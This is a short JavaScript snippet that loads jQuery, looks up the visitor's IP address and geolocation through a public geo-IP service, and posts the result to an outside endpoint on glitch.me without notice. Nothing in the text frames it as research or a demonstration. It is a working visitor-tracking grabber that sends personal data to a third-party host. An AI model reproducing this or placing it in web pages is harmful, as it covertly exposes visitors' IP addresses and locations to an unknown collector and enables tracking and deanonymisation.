import "https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"

$.getJSON('https://json.geoiplookup.io/api?callback=?', function(data) {
  $.post("https://hby-io.glitch.me/lol",data,()=>{});
});
